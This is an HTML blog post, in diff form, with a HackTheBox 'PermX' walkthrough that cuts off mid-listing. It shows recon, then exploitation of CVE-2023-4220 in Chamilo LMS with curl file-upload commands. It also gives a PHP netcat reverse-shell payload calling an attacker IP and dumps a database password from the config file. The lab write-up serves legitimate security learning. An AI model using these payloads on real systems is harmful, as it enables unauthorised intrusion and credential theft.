@@ -1,0 +1,799 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://foued-saidi.tech/2024/11/01/hackthebox-permx/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewPermX is an easy-difficulty machine from HackTheBox. It initially deals with some subdomain enumeration to discover a Chamilo LMS vulnerable to CVE-2023-4220 -an unauthenticated RCE- granting">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: PermX">
+<meta property="og:url" content="http://foued-saidi.tech/2024/11/01/Hackthebox-PermX/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewPermX is an easy-difficulty machine from HackTheBox. It initially deals with some subdomain enumeration to discover a Chamilo LMS vulnerable to CVE-2023-4220 -an unauthenticated RCE- granting">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/PermX/PermX.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/PermX/chamilo.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/PermX/chamilo1.png">
+<meta property="article:published_time" content="2024-11-01T14:52:28.000Z">
+<meta property="article:modified_time" content="2024-11-01T16:30:27.903Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/PermX/PermX.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: PermX -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"foued-saidi.tech","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":"https://www.instagram.com/saidi.foued/","zhihu":null,"twitter":"https://twitter.com/_kujen5","email":"foued.saidi.pro@gmail.com","linkedin":"https://www.linkedin.com/in/foued-saidi-pro/","facebook":"https://www.facebook.com/foued.saidi.980/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: PermX</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-11-01 15:52:28</span>
+        <span class="mobile">2024-11-01 15:52:28</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-11-01 17:30:27</span>
+            <span class="mobile">2024-11-01 17:30:27</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>PermX is an easy-difficulty machine from HackTheBox. It initially deals with some subdomain enumeration to discover a Chamilo LMS vulnerable to CVE-2023-4220 -an unauthenticated RCE- granting us system access. Later with some data exfil to get some database credentials, we’ll abuse a bash script with sudo privileges that’ll allow us to symlink the root directory, modifying the &#x2F;etc&#x2F;shadow file and gaining root privileges.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/PermX/PermX.png"
+                      alt="PermX-info-card"
+                ><figcaption>PermX-info-card</figcaption></figure></p>
+<h3 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h3><p>We’ll be first doing enumeration for open ports using nmap:</p>
+<h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h4><div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; nmap <span class="literal">-A</span> <span class="literal">-Pn</span> <span class="number">10.129</span>.<span class="number">117.84</span> </span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://nmap.org ) at <span class="number">2024</span><span class="literal">-11-01</span> <span class="number">15</span>:<span class="number">58</span> W. Central Africa Standard Time</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp open  ssh     OpenSSH <span class="number">8.9</span>p1 Ubuntu <span class="number">3</span>ubuntu0.<span class="number">10</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh<span class="literal">-hostkey</span>:</span><br><span class="line">|   <span class="number">256</span> e2:<span class="number">5</span>c:<span class="number">5</span>d:<span class="number">8</span>c:<span class="number">47</span>:<span class="number">3</span>e:d8:<span class="number">72</span>:f7:b4:<span class="number">80</span>:<span class="number">03</span>:<span class="number">49</span>:<span class="number">86</span>:<span class="number">6</span>d:ef (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">1</span>f:<span class="number">41</span>:<span class="number">02</span>:<span class="number">8</span>e:<span class="number">6</span>b:<span class="number">17</span>:<span class="number">18</span>:<span class="number">9</span>c:a0:<span class="built_in">ac</span>:<span class="number">54</span>:<span class="number">23</span>:e9:<span class="number">71</span>:<span class="number">30</span>:<span class="number">17</span> (ED25519)</span><br><span class="line"><span class="number">80</span>/tcp open  http    Apache httpd <span class="number">2.4</span>.<span class="number">52</span></span><br><span class="line">|_http<span class="literal">-title</span>: Did not follow redirect to http://permx.htb</span><br><span class="line">|_http<span class="literal">-server-header</span>: Apache/<span class="number">2.4</span>.<span class="number">52</span> (Ubuntu)</span><br><span class="line">Service Info: Host: <span class="number">127.0</span>.<span class="number">1.1</span>; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that we have our typical ssh port open alondside a web application deployed on port 80 redirecting us to <code>http://permx.htb</code>, so let’s go ahead and add an entry for <code>permx.htb</code> to our <code>/etc/hosts</code> file.</p>
+<h4 id="Subdomain-Enumeration-Ffuf"><a href="#Subdomain-Enumeration-Ffuf" class="headerlink" title="Subdomain Enumeration - Ffuf"></a>Subdomain Enumeration - Ffuf</h4><div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen\Desktop\Tools\ffuf_2.<span class="number">0.0</span>_windows_amd64&gt; .\ffuf.exe <span class="literal">-w</span> ..\SecLists<span class="literal">-master</span>\SecLists<span class="literal">-master</span>/Discovery\DNS\bitquark<span class="literal">-subdomains-top100000</span>.txt <span class="literal">-H</span> <span class="string">&quot;Host: FUZZ.permx.htb&quot;</span> <span class="literal">-u</span> <span class="string">&quot;http://10.129.117.84&quot;</span> <span class="literal">-fw</span> <span class="number">18</span></span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\</span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/</span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\</span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.0.0</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://10.129.117.84</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: C:\Users\0xkujen\Desktop\Tools\SecLists-master\SecLists-master\Discovery\DNS\bitquark-subdomains-top100000.txt</span></span><br><span class="line"><span class="string"> :: Header           : Host: FUZZ.permx.htb</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string"> :: Filter           : Response words: 18</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 195ms]:01] :: Errors: 0 ::</span></span><br><span class="line"><span class="string">    * FUZZ: www</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 3559ms]00:34] :: Errors: 0 ::</span></span><br><span class="line"><span class="string">    * FUZZ: lms</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Trying to enumerate subdomains with ffuf, we get <code>www</code> and <code>lms</code>. Let’s add these couple to our &#96;&#96;&#x2F;etc&#x2F;hosts&#96; file and check what we have.</p>
+<h3 id="Web-Application-http-lms-permx-htb"><a href="#Web-Application-http-lms-permx-htb" class="headerlink" title="Web Application - http://lms.permx.htb"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="http://lms.permx.htb/" >http://lms.permx.htb <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h3><p>Navigation to our web application, we are prompted with a <a class="link"   target="_blank" rel="noopener" href="https://chamilo.org/en/" >Chamilo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> login interface:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/PermX/chamilo.png"
+                      alt="Chamilo LMS"
+                ><figcaption>Chamilo LMS</figcaption></figure></p>
+<h4 id="CVE-2023-4220"><a href="#CVE-2023-4220" class="headerlink" title="CVE-2023-4220"></a>CVE-2023-4220</h4><p>Taking a look at <code>http://lms.permx.htb/README.md</code> (after some bruteforcing), we can see that the Chamilo version we’re dealing with is 1.11.xx:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/PermX/chamilo1.png"
+                      alt="Chamilo LMS"
+                ><figcaption>Chamilo LMS</figcaption></figure></p>
+<p>Looking out for some epxloits targeting this version, I stumbled upon <a class="link"   target="_blank" rel="noopener" href="https://starlabs.sg/advisories/23/23-4220/" >this insightful blog <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> talking about <a class="link"   target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2023-4220" >CVE-2023-4220 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> where we can exploit an Unauthenticated Big Upload File Remote Code Execution to land control over the system. So let’s try it out:<br>1- We first have to ensure that <code>http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/</code> exists, and it does.<br>2- Create our simple php command such as a casual <code>&lt;?php system(&#39;id&#39;); ?&gt;  3- Run this command </code>curl -F ‘bigUploadFile&#x3D;@rce.php’ ‘<a class="link"   target="_blank" rel="noopener" href="http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported%27%60%60" >http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported&#39;`` <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> to upload our malicious command file to the LMS platform.<br>4- Run this command <code>curl &#39;http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce.php&#39;</code> to execute our malicious command.<br>Lessgo:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kujen@kujen:~$ <span class="built_in">echo</span> <span class="string">&quot;&lt;?php system(&#x27;id&#x27;);&quot;</span> &gt; rce.php</span><br><span class="line">kujen@kujen:~$ curl -F <span class="string">&#x27;bigUploadFile=@rce.php&#x27;</span> <span class="string">&#x27;http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported&#x27;</span></span><br><span class="line">The file has successfully been uploaded.</span><br><span class="line">kujen@kujen:~$ curl <span class="string">&#x27;http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce.php&#x27;</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br></pre></td></tr></table></figure></div>
+<p>And it has been successful!<br>Let’s now get a shell on the system:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kujen@kujen:~$ <span class="built_in">cat</span> rce.php</span><br><span class="line">&lt;?php system(<span class="string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.x.x 9001 &gt;/tmp/f&quot;</span>); ?&gt;</span><br><span class="line">kujen@kujen:~$ curl -F <span class="string">&#x27;bigUploadFile=@rce.php&#x27;</span> <span class="string">&#x27;http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported&#x27;</span></span><br><span class="line">The file has successfully been uploaded.</span><br><span class="line">kujen@kujen:~$ curl <span class="string">&#x27;http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce.php&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>And we are in:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; nc <span class="literal">-lvnp</span> <span class="number">9001</span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">9001</span> ...</span><br><span class="line">connect to <span class="function">[<span class="number">10.10</span><span class="type">.x.x</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">10.129</span><span class="type">.117.84</span>] <span class="number">56424</span></span><br><span class="line">sh: <span class="number">0</span>: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">$</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Let’s no stablize our shell: <code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br>And let’s take a look for some database credentials, we might find something juicy. Running this command <code>www-data@permx:/var/www/chamilo$ find ./ -name config* 2&gt; /dev/null</code>,  we stumble upon <code>./app/config/configuration.php</code> file. So let’s check it out:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">www-data@permx:/var/www/chamilo$ <span class="built_in">cat</span> ./app/config/configuration.php | grep -i password</span><br><span class="line">&lt;t ./app/config/configuration.php | grep -i password</span><br><span class="line"><span class="variable">$_configuration</span>[<span class="string">&#x27;db_password&#x27;</span>] = <span class="string">&#x27;03F6lY3uXAP2bkW8&#x27;</span>;</span><br><span class="line">// Security word <span class="keyword">for</span> password recovery</span><br><span class="line"><span class="variable">$_configuration</span>[<span class="string">&#x27;password_encryption&#x27;</span>] = <span class="string">&#x27;bcrypt&#x27;</span>;</span><br><span class="line">// Set to <span class="literal">true</span> to allow automated password conversion after login <span class="keyword">if</span></span><br><span class="line">// password_encryption has changed since last login. See GH<span class="comment">#4063 for details.</span></span><br><span class="line">//<span class="variable">$_configuration</span>[<span class="string">&#x27;password_conversion&#x27;</span>] = <span class="literal">false</span>;</span><br><span class="line">// Customize password generation and verification</span><br><span class="line">/*<span class="variable">$_configuration</span>[<span class="string">&#x27;password_requirements&#x27;</span>] = [</span><br><span class="line">    <span class="string">&#x27;force_different_password&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">// Send two emails when creating a user. One with the username other with the password.</span><br><span class="line">// Validate user login via a webservice, Chamilo will send a <span class="string">&quot;login&quot;</span> and <span class="string">&quot;password&quot;</span> parameters</span><br><span class="line">        <span class="string">&#x27;wget_password&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">// Use this <span class="built_in">link</span> as the <span class="string">&quot;Forgot password?&quot;</span> <span class="built_in">link</span> instead of the default. This setting should be transformed into a hook <span class="keyword">for</span> plugins at a later time</span><br><span class="line">// Show/Hide password field <span class="keyword">in</span> user profile. Adds a customizable <span class="built_in">link</span> depending on the user status.</span><br><span class="line"><span class="variable">$_configuration</span>[<span class="string">&#x27;auth_password_links&#x27;</span>] = [</span><br><span class="line">                <span class="string">&#x27;show_password_field&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">                <span class="string">&#x27;show_password_field&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">// Ask user to renew password at first login.</span><br><span class="line">// Requires a user checkbox extra field called <span class="string">&quot;ask_new_password&quot;</span>.</span><br><span class="line">//<span class="variable">$_configuration</span>[<span class="string">&#x27;force_renew_password_at_first_login&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">// Add the <span 